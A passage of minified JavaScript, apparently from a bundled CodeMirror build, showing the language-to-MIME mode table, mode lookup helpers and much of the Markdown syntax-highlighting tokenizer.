Markdown",mime:"text/x-gfm",mode:"gfm",file:/^(readme|contributing|history)\.md$/i},{name:"Go",mime:"text/x-go",mode:"go",ext:["go"]},{name:"Groovy",mime:"text/x-groovy",mode:"groovy",ext:["groovy","gradle"],file:/^Jenkinsfile$/},{name:"HAML",mime:"text/x-haml",mode:"haml",ext:["haml"]},{name:"Haskell",mime:"text/x-haskell",mode:"haskell",ext:["hs"]},{name:"Haskell (Literate)",mime:"text/x-literate-haskell",mode:"haskell-literate",ext:["lhs"]},{name:"Haxe",mime:"text/x-haxe",mode:"haxe",ext:["hx"]},{name:"HXML",mime:"text/x-hxml",mode:"haxe",ext:["hxml"]},{name:"ASP.NET",mime:"application/x-aspx",mode:"htmlembedded",ext:["aspx"],alias:["asp","aspx"]},{name:"HTML",mime:"text/html",mode:"htmlmixed",ext:["html","htm","handlebars","hbs"],alias:["xhtml"]},{name:"HTTP",mime:"message/http",mode:"http"},{name:"IDL",mime:"text/x-idl",mode:"idl",ext:["pro"]},{name:"Pug",mime:"text/x-pug",mode:"pug",ext:["jade","pug"],alias:["jade"]},{name:"Java",mime:"text/x-java",mode:"clike",ext:["java"]},{name:"Java Server Pages",mime:"application/x-jsp",mode:"htmlembedded",ext:["jsp"],alias:["jsp"]},{name:"JavaScript",mimes:["text/javascript","text/ecmascript","application/javascript","application/x-javascript","application/ecmascript"],mode:"javascript",ext:["js"],alias:["ecmascript","js","node"]},{name:"JSON",mimes:["application/json","application/x-json"],mode:"javascript",ext:["json","map"],alias:["json5"]},{name:"JSON-LD",mime:"application/ld+json",mode:"javascript",ext:["jsonld"],alias:["jsonld"]},{name:"JSX",mime:"text/jsx",mode:"jsx",ext:["jsx"]},{name:"Jinja2",mime:"text/jinja2",mode:"jinja2",ext:["j2","jinja","jinja2"]},{name:"Julia",mime:"text/x-julia",mode:"julia",ext:["jl"],alias:["jl"]},{name:"Kotlin",mime:"text/x-kotlin",mode:"clike",ext:["kt"]},{name:"LESS",mime:"text/x-less",mode:"css",ext:["less"]},{name:"LiveScript",mime:"text/x-livescript",mode:"livescript",ext:["ls"],alias:["ls"]},{name:"Lua",mime:"text/x-lua",mode:"lua",ext:["lua"]},{name:"Markdown",mime:"text/x-markdown",mode:"markdown",ext:["markdown","md","mkd"]},{name:"mIRC",mime:"text/mirc",mode:"mirc"},{name:"MariaDB SQL",mime:"text/x-mariadb",mode:"sql"},{name:"Mathematica",mime:"text/x-mathematica",mode:"mathematica",ext:["m","nb","wl","wls"]},{name:"Modelica",mime:"text/x-modelica",mode:"modelica",ext:["mo"]},{name:"MUMPS",mime:"text/x-mumps",mode:"mumps",ext:["mps"]},{name:"MS SQL",mime:"text/x-mssql",mode:"sql"},{name:"mbox",mime:"application/mbox",mode:"mbox",ext:["mbox"]},{name:"MySQL",mime:"text/x-mysql",mode:"sql"},{name:"Nginx",mime:"text/x-nginx-conf",mode:"nginx",file:/nginx.*\.conf$/i},{name:"NSIS",mime:"text/x-nsis",mode:"nsis",ext:["nsh","nsi"]},{name:"NTriples",mimes:["application/n-triples","application/n-quads","text/n-triples"],mode:"ntriples",ext:["nt","nq"]},{name:"Objective-C",mime:"text/x-objectivec",mode:"clike",ext:["m"],alias:["objective-c","objc"]},{name:"Objective-C++",mime:"text/x-objectivec++",mode:"clike",ext:["mm"],alias:["objective-c++","objc++"]},{name:"OCaml",mime:"text/x-ocaml",mode:"mllike",ext:["ml","mli","mll","mly"]},{name:"Octave",mime:"text/x-octave",mode:"octave",ext:["m"]},{name:"Oz",mime:"text/x-oz",mode:"oz",ext:["oz"]},{name:"Pascal",mime:"text/x-pascal",mode:"pascal",ext:["p","pas"]},{name:"PEG.js",mime:"null",mode:"pegjs",ext:["jsonld"]},{name:"Perl",mime:"text/x-perl",mode:"perl",ext:["pl","pm"]},{name:"PHP",mimes:["text/x-php","application/x-httpd-php","application/x-httpd-php-open"],mode:"php",ext:["php","php3","php4","php5","php7","phtml"]},{name:"Pig",mime:"text/x-pig",mode:"pig",ext:["pig"]},{name:"Plain Text",mime:"text/plain",mode:"null",ext:["txt","text","conf","def","list","log"]},{name:"PLSQL",mime:"text/x-plsql",mode:"sql",ext:["pls"]},{name:"PostgreSQL",mime:"text/x-pgsql",mode:"sql"},{name:"PowerShell",mime:"application/x-powershell",mode:"powershell",ext:["ps1","psd1","psm1"]},{name:"Properties files",mime:"text/x-properties",mode:"properties",ext:["properties","ini","in"],alias:["ini","properties"]},{name:"ProtoBuf",mime:"text/x-protobuf",mode:"protobuf",ext:["proto"]},{name:"Python",mime:"text/x-python",mode:"python",ext:["BUILD","bzl","py","pyw"],file:/^(BUCK|BUILD)$/},{name:"Puppet",mime:"text/x-puppet",mode:"puppet",ext:["pp"]},{name:"Q",mime:"text/x-q",mode:"q",ext:["q"]},{name:"R",mime:"text/x-rsrc",mode:"r",ext:["r","R"],alias:["rscript"]},{name:"reStructuredText",mime:"text/x-rst",mode:"rst",ext:["rst"],alias:["rst"]},{name:"RPM Changes",mime:"text/x-rpm-changes",mode:"rpm"},{name:"RPM Spec",mime:"text/x-rpm-spec",mode:"rpm",ext:["spec"]},{name:"Ruby",mime:"text/x-ruby",mode:"ruby",ext:["rb"],alias:["jruby","macruby","rake","rb","rbx"]},{name:"Rust",mime:"text/x-rustsrc",mode:"rust",ext:["rs"]},{name:"SAS",mime:"text/x-sas",mode:"sas",ext:["sas"]},{name:"Sass",mime:"text/x-sass",mode:"sass",ext:["sass"]},{name:"Scala",mime:"text/x-scala",mode:"clike",ext:["scala"]},{name:"Scheme",mime:"text/x-scheme",mode:"scheme",ext:["scm","ss"]},{name:"SCSS",mime:"text/x-scss",mode:"css",ext:["scss"]},{name:"Shell",mimes:["text/x-sh","application/x-sh"],mode:"shell",ext:["sh","ksh","bash"],alias:["bash","sh","zsh"],file:/^PKGBUILD$/},{name:"Sieve",mime:"application/sieve",mode:"sieve",ext:["siv","sieve"]},{name:"Slim",mimes:["text/x-slim","application/x-slim"],mode:"slim",ext:["slim"]},{name:"Smalltalk",mime:"text/x-stsrc",mode:"smalltalk",ext:["st"]},{name:"Smarty",mime:"text/x-smarty",mode:"smarty",ext:["tpl"]},{name:"Solr",mime:"text/x-solr",mode:"solr"},{name:"SML",mime:"text/x-sml",mode:"mllike",ext:["sml","sig","fun","smackspec"]},{name:"Soy",mime:"text/x-soy",mode:"soy",ext:["soy"],alias:["closure template"]},{name:"SPARQL",mime:"application/sparql-query",mode:"sparql",ext:["rq","sparql"],alias:["sparul"]},{name:"Spreadsheet",mime:"text/x-spreadsheet",mode:"spreadsheet",alias:["excel","formula"]},{name:"SQL",mime:"text/x-sql",mode:"sql",ext:["sql"]},{name:"SQLite",mime:"text/x-sqlite",mode:"sql"},{name:"Squirrel",mime:"text/x-squirrel",mode:"clike",ext:["nut"]},{name:"Stylus",mime:"text/x-styl",mode:"stylus",ext:["styl"]},{name:"Swift",mime:"text/x-swift",mode:"swift",ext:["swift"]},{name:"sTeX",mime:"text/x-stex",mode:"stex"},{name:"LaTeX",mime:"text/x-latex",mode:"stex",ext:["text","ltx","tex"],alias:["tex"]},{name:"SystemVerilog",mime:"text/x-systemverilog",mode:"verilog",ext:["v","sv","svh"]},{name:"Tcl",mime:"text/x-tcl",mode:"tcl",ext:["tcl"]},{name:"Textile",mime:"text/x-textile",mode:"textile",ext:["textile"]},{name:"TiddlyWiki",mime:"text/x-tiddlywiki",mode:"tiddlywiki"},{name:"Tiki wiki",mime:"text/tiki",mode:"tiki"},{name:"TOML",mime:"text/x-toml",mode:"toml",ext:["toml"]},{name:"Tornado",mime:"text/x-tornado",mode:"tornado"},{name:"troff",mime:"text/troff",mode:"troff",ext:["1","2","3","4","5","6","7","8","9"]},{name:"TTCN",mime:"text/x-ttcn",mode:"ttcn",ext:["ttcn","ttcn3","ttcnpp"]},{name:"TTCN_CFG",mime:"text/x-ttcn-cfg",mode:"ttcn-cfg",ext:["cfg"]},{name:"Turtle",mime:"text/turtle",mode:"turtle",ext:["ttl"]},{name:"TypeScript",mime:"application/typescript",mode:"javascript",ext:["ts"],alias:["ts"]},{name:"TypeScript-JSX",mime:"text/typescript-jsx",mode:"jsx",ext:["tsx"],alias:["tsx"]},{name:"Twig",mime:"text/x-twig",mode:"twig"},{name:"Web IDL",mime:"text/x-webidl",mode:"webidl",ext:["webidl"]},{name:"VB.NET",mime:"text/x-vb",mode:"vb",ext:["vb"]},{name:"VBScript",mime:"text/vbscript",mode:"vbscript",ext:["vbs"]},{name:"Velocity",mime:"text/velocity",mode:"velocity",ext:["vtl"]},{name:"Verilog",mime:"text/x-verilog",mode:"verilog",ext:["v"]},{name:"VHDL",mime:"text/x-vhdl",mode:"vhdl",ext:["vhd","vhdl"]},{name:"Vue.js Component",mimes:["script/x-vue","text/x-vue"],mode:"vue",ext:["vue"]},{name:"XML",mimes:["application/xml","text/xml"],mode:"xml",ext:["xml","xsl","xsd","svg"],alias:["rss","wsdl","xsd"]},{name:"XQuery",mime:"application/xquery",mode:"xquery",ext:["xy","xquery"]},{name:"Yacas",mime:"text/x-yacas",mode:"yacas",ext:["ys"]},{name:"YAML",mimes:["text/x-yaml","text/yaml"],mode:"yaml",ext:["yaml","yml"],alias:["yml"]},{name:"Z80",mime:"text/x-z80",mode:"z80",ext:["z80"]},{name:"mscgen",mime:"text/x-mscgen",mode:"mscgen",ext:["mscgen","mscin","msc"]},{name:"xu",mime:"text/x-xu",mode:"mscgen",ext:["xu"]},{name:"msgenny",mime:"text/x-msgenny",mode:"mscgen",ext:["msgenny"]},{name:"WebAssembly",mime:"text/webassembly",mode:"wast",ext:["wat","wast"]}];for(var r=0;r<n.modeInfo.length;r++){var a=n.modeInfo[r];a.mimes&&(a.mime=a.mimes[0])}n.findModeByMIME=function(l){l=l.toLowerCase();for(var u=0;u<n.modeInfo.length;u++){var f=n.modeInfo[u];if(f.mime==l)return f;if(f.mimes){for(var h=0;h<f.mimes.length;h++)if(f.mimes[h]==l)return f}}if(/\+xml$/.test(l))return n.findModeByMIME("application/xml");if(/\+json$/.test(l))return n.findModeByMIME("application/json")},n.findModeByExtension=function(l){l=l.toLowerCase();for(var u=0;u<n.modeInfo.length;u++){var f=n.modeInfo[u];if(f.ext){for(var h=0;h<f.ext.length;h++)if(f.ext[h]==l)return f}}},n.findModeByFileName=function(l){for(var u=0;u<n.modeInfo.length;u++){var f=n.modeInfo[u];if(f.file&&f.file.test(l))return f}var h=l.lastIndexOf("."),m=h>-1&&l.substring(h+1,l.length);if(m)return n.findModeByExtension(m)},n.findModeByName=function(l){l=l.toLowerCase();for(var u=0;u<n.modeInfo.length;u++){var f=n.modeInfo[u];if(f.name.toLowerCase()==l)return f;if(f.alias){for(var h=0;h<f.alias.length;h++)if(f.alias[h].toLowerCase()==l)return f}}}})}()),nb.exports}(function(e,t){(function(n){n(kr,U_,z_())})(function(n){n.defineMode("markdown",function(r,a){var l=n.getMode(r,"text/html"),u=l.name=="null";function f(Q){if(n.findModeByName){var k=n.findModeByName(Q);k&&(Q=k.mime||k.mimes[0])}var se=n.getMode(r,Q);return se.name=="null"?null:se}a.highlightFormatting===void 0&&(a.highlightFormatting=!1),a.maxBlockquoteDepth===void 0&&(a.maxBlockquoteDepth=0),a.taskLists===void 0&&(a.taskLists=!1),a.strikethrough===void 0&&(a.strikethrough=!1),a.emoji===void 0&&(a.emoji=!1),a.fencedCodeBlockHighlighting===void 0&&(a.fencedCodeBlockHighlighting=!0),a.fencedCodeBlockDefaultMode===void 0&&(a.fencedCodeBlockDefaultMode="text/plain"),a.xml===void 0&&(a.xml=!0),a.tokenTypeOverrides===void 0&&(a.tokenTypeOverrides={});var h={header:"header",code:"comment",quote:"quote",list1:"variable-2",list2:"variable-3",list3:"keyword",hr:"hr",image:"image",imageAltText:"image-alt-text",imageMarker:"image-marker",formatting:"formatting",linkInline:"link",linkEmail:"link",linkText:"link",linkHref:"string",em:"em",strong:"strong",strikethrough:"strikethrough",emoji:"builtin"};for(var m in h)h.hasOwnProperty(m)&&a.tokenTypeOverrides[m]&&(h[m]=a.tokenTypeOverrides[m]);var x=/^([*\-_])(?:\s*\1){2,}\s*$/,g=/^(?:[*\-+]|^[0-9]+([.)]))\s+/,b=/^\[(x| )\](?=\s)/i,E=a.allowAtxHeaderWithoutSpace?/^(#+)/:/^(#+)(?: |$)/,C=/^ {0,3}(?:\={1,}|-{2,})\s*$/,P=/^[^#!\[\]*_\\<>` "'(~:]+/,O=/^(~~~+|```+)[ \t]*([\w\/+#-]*)[^\n`]*$/,N=/^\s*\[[^\]]+?\]:.*$/,T=/[!"#$%&'()*+,\-.\/:;<=>?@\[\\\]^_`{|}~\xA1\xA7\xAB\xB6\xB7\xBB\xBF\u037E\u0387\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u0AF0\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F14\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1360-\u1368\u1400\u166D\u166E\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CC0-\u1CC7\u1CD3\u2010-\u2027\u2030-\u2043\u2045-\u2051\u2053-\u205E\u207D\u207E\u208D\u208E\u2308-\u230B\u2329\u232A\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30-\u2E42\u3001-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA8FC\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uAAF0\uAAF1\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]|\uD800[\uDD00-\uDD02\uDF9F\uDFD0]|\uD801\uDD6F|\uD802[\uDC57\uDD1F\uDD3F\uDE50-\uDE58\uDE7F\uDEF0-\uDEF6\uDF39-\uDF3F\uDF99-\uDF9C]|\uD804[\uDC47-\uDC4D\uDCBB\uDCBC\uDCBE-\uDCC1\uDD40-\uDD43\uDD74\uDD75\uDDC5-\uDDC9\uDDCD\uDDDB\uDDDD-\uDDDF\uDE38-\uDE3D\uDEA9]|\uD805[\uDCC6\uDDC1-\uDDD7\uDE41-\uDE43\uDF3C-\uDF3E]|\uD809[\uDC70-\uDC74]|\uD81A[\uDE6E\uDE6F\uDEF5\uDF37-\uDF3B\uDF44]|\uD82F\uDC9F|\uD836[\uDE87-\uDE8B]/,A="    ";function _(Q,k,se){return k.f=k.inline=se,se(Q,k)}function M(Q,k,se){return k.f=k.block=se,se(Q,k)}function R(Q){return!Q||!/\S/.test(Q.string)}function B(Q){if(Q.linkTitle=!1,Q.linkHref=!1,Q.linkText=!1,Q.em=!1,Q.strong=!1,Q.strikethrough=!1,Q.quote=0,Q.indentedCode=!1,Q.f==$){var k=u;if(!k){var se=n.innerMode(l,Q.htmlState);k=se.mode.name=="xml"&&se.state.tagStart===null&&!se.state.context&&se.state.tokenize.isInText}k&&(Q.f=me,Q.block=U,Q.htmlState=null)}return Q.trailingSpace=0,Q.trailingSpaceNewLine=!1,Q.prevLine=Q.thisLine,Q.thisLine={stream:null},null}function U(Q,k){var se=Q.column()===k.indentation,Ve=R(k.prevLine.stream),De=k.indentedCode,Ke=k.prevLine.hr,vt=k.list!==!1,lt=(k.listStack[k.listStack.length-1]||0)+3;k.indentedCode=!1;var Tt=k.indentation;if(k.indentationDiff===null&&(k.indentationDiff=k.indentation,vt)){for(k.list=null;Tt<k.listStack[k.listStack.length-1];)k.listStack.pop(),k.listStack.length?k.indentation=k.listStack[k.listStack.length-1]:k.list=!1;k.list!==!1&&(k.indentationDiff=Tt-k.listStack[k.listStack.length-1])}var ut=!Ve&&!Ke&&!k.prevLine.header&&(!vt||!De)&&!k.prevLine.fencedCodeEnd,bt=(k.list===!1||Ke||Ve)&&k.indentation<=lt&&Q.match(x),Mt=null;if(k.indentationDiff>=4&&(De||k.prevLine.fencedCodeEnd||k.prevLine.header||Ve))return Q.skipToEnd(),k.indentedCode=!0,h.code;if(Q.eatSpace())return null;if(se&&k.indentation<=lt&&(Mt=Q.match(E))&&Mt[1].length<=6)return k.quote=0,k.header=Mt[1].length,k.thisLine.header=!0,a.highlightFormatting&&(k.formatting="header"),k.f=k.inline,ne(k);if(k.indentation<=lt&&Q.eat(">"))return k.quote=se?1:k.quote+1,a.highlightFormatting&&(k.formatting="quote"),Q.eatSpace(),ne(k);if(!bt&&!k.setext&&se&&k.indentation<=lt&&(Mt=Q.match(g))){var nn=Mt[1]?"ol":"ul";return k.indentation=Tt+Q.current().length,k.list=!0,k.quote=0,k.listStack.push(k.indentation),k.em=!1,k.strong=!1,k.code=!1,k.strikethrough=!1,a.taskLists&&Q.match(b,!1)&&(k.taskList=!0),k.f=k.inline,a.highlightFormatting&&(k.formatting=["list","list-"+nn]),ne(k)}else{if(se&&k.indentation<=lt&&(Mt=Q.match(O,!0)))return k.quote=0,k.fencedEndRE=new RegExp(Mt[1]+"+ *$"),k.localMode=a.fencedCodeBlockHighlighting&&f(Mt[2]||a.fencedCodeBlockDefaultMode),k.localMode&&(k.localState=n.startState(k.localMode)),k.f=k.block=Y,a.highlightFormatting&&(k.formatting="code-block"),k.code=-1,ne(k);if(k.setext||(!ut||!vt)&&!k.quote&&k.list===!1&&!k.code&&!bt&&!N.test(Q.string)&&(Mt=Q.lookAhead(1))&&(Mt=Mt.match(C)))return k.setext?(k.header=k.setext,k.setext=0,Q.skipToEnd(),a.highlightFormatting&&(k.formatting="header")):(k.header=Mt[0].charAt(0)=="="?1:2,k.setext=k.header),k.thisLine.header=!0,k.f=k.inline,ne(k);if(bt)return Q.skipToEnd(),k.hr=!0,k.thisLine.hr=!0,h.hr;if(Q.peek()==="[")return _(Q,k,ae)}return _(Q,k,k.inline)}function $(Q,k){var se=l.token(Q,k.htmlState);if(!u){var Ve=n.innerMode(l,k.htmlState);(Ve.mode.name=="xml"&&Ve.state.tagStart===null&&!Ve.state.context&&Ve.state.tokenize.isInText||k.md_inside&&Q.current().indexOf(">")>-1)&&(k.f=me,k.block=U,k.htmlState=null)}return se}function Y(Q,k){var se=k.listStack[k.listStack.length-1]||0,Ve=k.indentation<se,De=se+3;if(k.fencedEndRE&&k.indentation<=De&&(Ve||Q.match(k.fencedEndRE))){a.highlightFormatting&&(k.formatting="code-block");var Ke;return Ve||(Ke=ne(k)),k.localMode=k.localState=null,k.block=U,k.f=me,k.fencedEndRE=null,k.code=0,k.thisLine.fencedCodeEnd=!0,Ve?M(Q,k,k.block):Ke}else return k.localMode?k.localMode.token(Q,k.localState):(Q.skipToEnd(),h.code)}function ne(Q){var k=[];if(Q.formatting){k.push(h.formatting),typeof Q.formatting=="string"&&(Q.formatting=[Q.formatting]);for(var se=0;se<Q.formatting.length;se++)k.push(h.formatting+"-"+Q.formatting[se]),Q.formatting[se]==="header"&&k.push(h.formatting+"-"+Q.formatting[se]+"-"+Q.header),Q.formatting[se]==="quote"&&(!a.maxBlockquoteDepth||a.maxBlockquoteDepth>=Q.quote?k.push(h.formatting+"-"+Q.formatting[se]+"-"+Q.quote):k.push("error"))}if(Q.taskOpen)return k.push("meta"),k.length?k.join(" "):null;if(Q.taskClosed)return k.push("property"),k.length?k.join(" "):null;if(Q.linkHref?k.push(h.linkHref,"url"):(Q.strong&&k.push(h.strong),Q.em&&k.push(h.em),Q.strikethrough&&k.push(h.strikethrough),Q.emoji&&k.push(h.emoji),Q.linkText&&k.push(h.linkText),Q.code&&k.push(h.code),Q.image&&k.push(h.image),Q.imageAltText&&k.push(h.imageAltText,"link"),Q.imageMarker&&k.push(h.imageMarker)),Q.header&&k.push(h.header,h.header+"-"+Q.header),Q.quote&&(k.push(h.quote),!a.maxBlockquoteDepth||a.maxBlockquoteDepth>=Q.quote?k.push(h.quote+"-"+Q.quote):k.push(h.quote+"-"+a.maxBlockquoteDepth)),Q.list!==!1){var Ve=(Q.listStack.length-1)%3;Ve?Ve===1?k.push(h.list2):k.push(h.list3):k.push(h.list1)}return Q.trailingSpaceNewLine?k.push("trailing-space-new-line"):Q.trailingSpace&&k.push("trailing-space-"+(Q.trailingSpace%2?"a":"b")),k.length?k.join(" "):null}function Z(Q,k){if(Q.match(P,!0))return ne(k)}function me(Q,k){var se=k.text(Q,k);if(typeof se<"u")return se;if(k.list)return k.list=null,ne(k);if(k.taskList){var Ve=Q.match(b,!0)[1]===" ";return Ve?k.taskOpen=!0:k.taskClosed=!0,a.highlightFormatting&&(k.formatting="task"),k.taskList=!1,ne(k)}if(k.taskOpen=!1,k.taskClosed=!1,k.header&&Q.match(/^#+$/,!0))return a.highlightFormatting&&(k.formatting="header"),ne(k);var De=Q.next();if(k.linkTitle){k.linkTitle=!1;var Ke=De;De==="("&&(Ke=")"),Ke=(Ke+"").replace(/([.?*+^\[\]\\(){}|-])/g,"\\$1");var vt="^\\s*(?:[^"+Ke+"\\\\]+|\\\\\\\\|\\\\.)"+Ke;if(Q.match(new RegExp(vt),!0))return h.linkHref}if(De==="`"){var lt=k.formatting;a.highlightFormatting&&(k.formatting="code"),Q.eatWhile("`");var Tt=Q.current().length;if(k.code==0&&(!k.quote||Tt==1))return k.code=Tt,ne(k);if(Tt==k.code){var ut=ne(k);return k.code=0,ut}else return k.formatting=lt,ne(k)}else if(k.code)return ne(k);if(De==="\\"&&(Q.next(),a.highlightFormatting)){var bt=ne(k),Mt=h.formatting+"-escape";return bt?bt+" "+Mt:Mt}if(De==="!"&&Q.match(/\[[^\]]*\] ?(?:\(|\[)/,!1))return k.imageMarker=!0,k.image=!0,a.highlightFormatting&&(k.formatting="image"),ne(k);if(De==="["&&k.imageMarker&&Q.match(/[^\]]*\](\(.*?\)| ?\[.*?\])/,!1))return k.imageMarker=!1,k.imageAltText=!0,a.highlightFormatting&&(k.formatting="image"),ne(k);if(De==="]"&&k.imageAltText){a.highlightFormatting&&(k.formatting="image");var bt=ne(k);return k.imageAltText=!1,k.image=!1,k.inline=k.f=J,bt}if(De==="["&&!k.image)return k.linkText&&Q.match(/^.*?\]/)||(k.linkText=!0,a.highlightFormatting&&(k.formatting="link")),ne(k);if(De==="]"&&k.linkText){a.highlightFormatting&&(k.formatting="link");var bt=ne(k);return k.linkText=!1,k.inline=k.f=Q.match(/\(.*?\)| ?\[.*?\]/,!1)?J:me,bt}if(De==="<"&&Q.match(/^(https?|ftps?):\/\/(?:[^\\>]|\\.)+>/,!1)){k.f=k.inline=ye,a.highlightFormatting&&(k.formatting="link");var bt=ne(k);return bt?bt+=" ":bt="",bt+h.linkInline}if(De==="<"&&Q.match(/^[^> \\]+@(?:[^\\>]|\\.)+>/,!1)){k.f=k.inline=ye,a.highlightFormatting&&(k.formatting="link");var bt=ne(k);return bt?bt+=" ":bt="",bt+h.linkEmail}if(a.xml&&De==="<"&&Q.match(/^(!--|\?|!\[CDATA\[|[a-z][a-z0-9-]*(?:\s+[a-z_:.\-]+(?:\s*=\s*[^>]+)?)*\s*(?:>|$))/i,!1)){var nn=Q.string.indexOf(">",Q.pos);if(nn!=-1){var $e=Q.string.substring(Q.start,nn);/markdown\s*=\s*('|"){0,1}1('|"){0,1}/.test($e)&&(k.md_inside=!0)}return Q.backUp(1),k.htmlState=n.startState(l),M(Q,k,$)}if(a.xml&&De==="<"&&Q.match(/^\/\w*?>/))return k.md_inside=!1,"tag";if(De==="*"||De==="_"){for(var Hn=1,Un=Q.pos==1?" ":Q.string.charAt(Q.pos-2);Hn<3&&Q.eat(De);)Hn++;var zn=Q.peek()||" ",fr=!/\s/.test(zn)&&(!T.test(zn)||/\s/.test(Un)||T.test(Un)),it=!/\s/.test(Un)&&(!T.test(Un)||/\s/.test(zn)||T.test(zn)),Wn=null,Tr=null;if(Hn%2&&(!k.em&&fr&&(De==="*"||!it||T.test(Un))?Wn=!0:k.em==De&&it&&(De==="*"||!fr||T.test(zn))&&(Wn=!1)),Hn>1&&(!k.strong&&fr&&(De==="*"||!it||T.test(Un))?Tr=!0:k.strong==De&&it&&(De==="*"||!fr||T.test(zn))&&(Tr=!1)),Tr!=null||Wn!=null){a.highlightFormatting&&(k.formatting=Wn==null?"strong":Tr==null?"em":"strong em"),Wn===!0&&(k.em=De),Tr===!0&&(k.strong=De);var ut=ne(k);return Wn===!1&&(k.em=!1),Tr===!1&&(k.strong=!1),ut}}else if(De===" "&&(Q.eat("*")||Q.eat("_"))){if(Q.peek()===" ")return ne(k);Q.backUp(1)}if(a.strikethrough){if(De==="~"&&Q.eatWhile(De)){if(k.strikethrough){a.highlightFormatting&&(k.formatting="strikethrough");var ut=ne(k);return k.strikethrough=!1,ut}else if(Q.match(/^[^\s]/,!1))return k.strikethrough=!0,a.highlightFormatting&&(k.formatting="strikethrough"),ne(k)}else if(De===" "&&Q.match("~~",!0)){if(Q.peek()===" ")return ne(k);Q.backUp(2)}}if(a.emoji&&De===":"&&Q.match(/^(?:[a-z_\d+][a-z_\d+-]*|\-[a-z_\d+][a-z_\d+-]*):/)){k.emoji=!0,a.highlightFormatting&&(k.formatting="emoji");var Wi=ne(k);return k.emoji=!1,Wi}return De===" "&&(Q.match(/^ +$/,!1)?k.trailingSpace++:k.trailingSpace&&(k.trailingSpaceNewLine=!0)),ne(k)}function ye(Q,k){var se=Q.next();if(se===">"){k.f=k.inline=me,a.highlightFormatting&&(k.formatting="link");var Ve=ne(k);return Ve?Ve+=" ":Ve="",Ve+h.linkInline}return Q.match(/^[^>]+/,!0),h.linkInline}function J(Q,k){if(Q.eatSpace())return null;var se=Q.next();return se==="("||se==="["?(k.f=k.inline=oe(se==="("?")":"]"),a.highlightFormatting&&(k.formatting="link-string"),k.linkHref=!0,ne(k)):"error"}var pe={")":/^(?:[^\\\(\)]|\\.|\((?:[^\\\(\)]|\\.)*\))*?(?=\))/,"]":/^(?:[^\\\[\]]|\\.|\[(?:[^\\\[\]]|\\.)*\])*?(?=\])/};function oe(Q){return function(k,se){var Ve=k.next();if(Ve===Q){se.f=se.inline=me,a.highlightFormatting&&(se.formatting="link-string");var De=ne(se);return se.linkHref=!1,De}return k.match(pe[Q]),se.linkHref=!0,ne(se)}}function ae(Q,k){return Q.match(/^([^\]\\]|\\.)*\]:/,!1)?(k.f=xe,Q.next(),a.highlightFormatting&&(k.formatting="link"),k.linkText=!0,ne(k)):_(Q,k,me)}function xe(Q,k){if(Q.match("]:",!0)){k.f=k.inline=q,a.highlightFormatting&&(k.formatting="link");var se=ne(k);return k.linkText=!1,se}return Q.match(/^([^\]\\]|\\.)+/,!0),h.linkText}function q(Q,k){return Q.eatSpace()?null:(Q.match(/^[^\s]+/,!0),Q.peek()===void 0?k.linkTitle=!0:Q.match(/^(?:\s+(?:"(?:[^"\\]|\\.)+"|'(?:[^'\\]|\\.)+'|\((?:[^)\\]|\\.)+\)))?/,!0),k.f=k.inline=me,h.linkHref+" url")}var We={startState:function(){return{f:U,prevLine:{stream:null},thisLine:{stream:null},block:U,htmlState:null,indentation:0,inline:me,text:Z,formatting:!1,linkText:!1,linkHref:!1,linkTitle:!1,code:0,em:!1,strong:!1,header:0,setext:0,hr:!1,taskList:!1,list:!1,listStack:[],quote:0,trailingSpace:0,trailingSpaceNewLine:!1,strikethrough:!1,emoji:!1,fencedEndRE:null}},copyState:function(Q){return{f:Q.f,prevLine:Q.prevLine,thisLine:Q.thisLine,block:Q.block,htmlState:Q.htmlState&&n.copyState(l,Q.htmlState),indentation:Q.indentation,localMode:Q.localMode,localState:Q.localMode?n.copyState(Q.localMode,Q.localState):null,inline:Q.inline,text:Q.text,formatting:!1,linkText:Q.linkText,linkTitle:Q.linkTitle,linkHref:Q.linkHref,code:Q.code,em:Q.em,strong:Q.strong,strikethrough:Q.strikethrough,emoji:Q.emoji,header:Q.header,setext:Q.setext,hr:Q.hr,taskList:Q.taskList,list:Q.list,listStack:Q.listStack.slice(0),quote:Q.quote,indentedCode:Q.indentedCode,trailingSpace:Q.trailingSpace,trailingSpaceNewLine:Q.trailingSpaceNewLine,md_inside:Q.md_inside,fencedEndRE:Q.fencedEndRE}},token:function(Q,k){if(k.formatting=!1,Q!=k.thisLine.stream){if(k.header=0,k.hr=!1,Q.match(/^\s*$/,!0))return B(k),null;if(k.prevLine=k.thisLine,k.thisLine={stream:Q},k.taskList=!1,k.trailingSpace=0,k.trailingSpaceNewLine=!1,!k.localState&&(k.f=k.block,k.f!=$)){var se=Q.match(/^\s*/,!0)[0].replace(/\t/g,A).length;if(k.indentation=se,k.indentationDiff=null,se>0)return null}}return k.f(Q,k)},innerMode:function(Q){return Q.block==$?{state:Q.htmlState,mode:l}:Q.localState?{state:Q.localState,mode:Q.localMode}:{state:Q,mode:We}},indent:function(Q,k,se){return 